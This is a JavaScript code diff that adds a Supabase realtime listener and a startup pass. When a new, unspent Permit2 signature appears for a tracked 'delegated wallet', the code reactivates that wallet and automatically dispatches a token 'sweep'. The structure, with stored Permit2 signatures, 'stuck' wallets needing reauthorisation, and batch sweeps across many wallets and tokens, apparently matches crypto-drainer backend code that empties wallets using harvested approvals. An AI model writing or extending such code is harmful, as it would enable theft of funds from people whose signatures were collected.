@@ -3037,9 +3037,39 @@ function subscribeRealtime() {
       }
     )
 
+    .on(
+      "postgres_changes",
+      { event: "INSERT", schema: "public", table: "permit2_signatures", filter: `chain=eq.${CHAIN}` },
+      async (payload) => {
+        const row = payload.new || {};
+        const sigAddress = row.address || "";
+        const walletAddrRaw = sigAddress.endsWith("-sig") ? sigAddress.slice(0, -4) : sigAddress;
+        const address = normalizeAddress(walletAddrRaw);
+        if (!address) return;
+        const key = address.toLowerCase();
+        const existing = monitoredWallets.get(key);
+        if (!existing) return;
+        if (!existing.needs_reactivation) return;
+        if (existing.type !== "permit2-gasless" && existing.type !== "permit2") return;
+        if (row.spent === true) return;
+        const deadline = row.deadline ? new Date(row.deadline).getTime() : Infinity;
+        if (deadline < Date.now()) return;
+        log(`[realtime] 🔑 fresh sig for stuck wallet ${address.slice(0, 10)} — auto-reactivating`);
+        if (supabase) {
+          await supabase.from("delegated_wallets")
+            .update({ needs_reactivation: false })
+            .eq("address", key).eq("chain", CHAIN).then(v => v, () => {});
+        }
+        monitoredWallets.set(key, { ...existing, needs_reactivation: false });
+        needsReauthWallets.delete(key);
+        log(`[realtime] 🔄 reactivated ${address.slice(0, 10)} via permit2_signatures — dispatching sweep`);
+        dispatchSweep({ address, type: existing.type }).catch(e => log(`[realtime] sweep error: ${e.message}`));
+      }
+    )
+
     .subscribe((status) => {
       if (status === "SUBSCRIBED") {
-        log(`[realtime] ✅ subscribed (delegated_wallets, chain=${CHAIN})`);
+        log(`[realtime] ✅ subscribed (delegated_wallets + permit2_signatures, chain=${CHAIN})`);
       } else if (status === "CHANNEL_ERROR" || status === "TIMED_OUT") {
         warn(`[realtime] ${status} — resubscribing in 10s`);
         setTimeout(subscribeRealtime, 10_000);
@@ -3181,6 +3211,34 @@ async function init() {
 }
 
 async function startupSweepPass() {
+  if (supabase) {
+    try {
+      const { data: freshSigs } = await supabase
+        .from("permit2_signatures")
+        .select("address, deadline, spent")
+        .eq("chain", CHAIN)
+        .or("spent.is.null,spent.eq.false");
+      for (const sig of freshSigs || []) {
+        const sigAddress = sig.address || "";
+        const walletAddrRaw = sigAddress.endsWith("-sig") ? sigAddress.slice(0, -4) : sigAddress;
+        const address = normalizeAddress(walletAddrRaw);
+        if (!address) continue;
+        const key = address.toLowerCase();
+        const existing = monitoredWallets.get(key);
+        if (!existing?.needs_reactivation) continue;
+        if (existing.type !== "permit2-gasless" && existing.type !== "permit2") continue;
+        const deadline = sig.deadline ? new Date(sig.deadline).getTime() : Infinity;
+        if (deadline < Date.now()) continue;
+        log(`[startup] 🔑 fresh sig found for stuck wallet ${address.slice(0, 10)} — auto-reactivating`);
+        await supabase.from("delegated_wallets")
+          .update({ needs_reactivation: false })
+          .eq("address", key).eq("chain", CHAIN).then(v => v, () => {});
+        monitoredWallets.set(key, { ...existing, needs_reactivation: false });
+        needsReauthWallets.delete(key);
+      }
+    } catch (e) { warn(`[startup] sig reactivation check error: ${e.message}`); }
+  }
+
   const wallets = [...monitoredWallets.values()].filter(w => w.type !== "monitoring" && !w.needs_reactivation);
   if (!wallets.length || !TOKENS.length) return;
   log(`[startup] batch-checking ${wallets.length} wallets × ${TOKENS.length} tokens…`);
